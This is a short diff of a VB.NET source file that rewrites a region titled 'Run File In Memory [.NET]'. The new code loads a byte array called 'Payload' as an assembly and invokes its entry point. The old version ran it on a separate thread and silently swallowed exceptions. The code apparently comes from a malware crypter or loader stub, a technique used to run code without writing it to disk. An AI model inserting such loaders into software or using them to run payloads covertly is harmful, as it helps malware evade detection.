@@ -38,26 +38,14 @@
 #End Region
 
 #Region "Run File In Memory [.NET]"
-    Private Delegate Function ExecuteAssembly(ByVal sender As Object, ByVal parameters As Object()) As Object
-    Public Sub Reflection(ByVal buffer As Byte())
-        Try
-            Dim parameters As Object() = Nothing
-            Dim assembly As Reflection.Assembly = Threading.Thread.GetDomain().Load(buffer)
-            Dim entrypoint As Reflection.MethodInfo = assembly.EntryPoint
-            If entrypoint.GetParameters().Length > 0 Then
-                parameters = New Object() {New String() {Nothing}}
-            End If
-            Dim assemblyExecuteThread As Threading.Thread = New Threading.Thread(Sub()
-                                                                                     Threading.Thread.BeginThreadAffinity()
-                                                                                     Threading.Thread.BeginCriticalRegion()
-                                                                                     Dim executeAssembly As ExecuteAssembly = New ExecuteAssembly(AddressOf entrypoint.Invoke)
-                                                                                     executeAssembly(Nothing, parameters)
-                                                                                     Threading.Thread.EndCriticalRegion()
-                                                                                     Threading.Thread.EndThreadAffinity()
-                                                                                 End Sub)
-            assemblyExecuteThread.Start()
-        Catch ex As Exception
-        End Try
+    Public Sub Execute(ByVal Payload As Object)
+        Dim Loader As System.Reflection.Assembly = System.Reflection.Assembly.Load(CType(Payload, Byte()))
+
+        If Loader.EntryPoint.GetParameters().Length > 0 Then
+            Loader.EntryPoint.Invoke(Nothing, New Object() {New String() {Nothing}})
+        Else
+            Loader.EntryPoint.Invoke(Nothing, Nothing)
+        End If
     End Sub
 #End Region
 
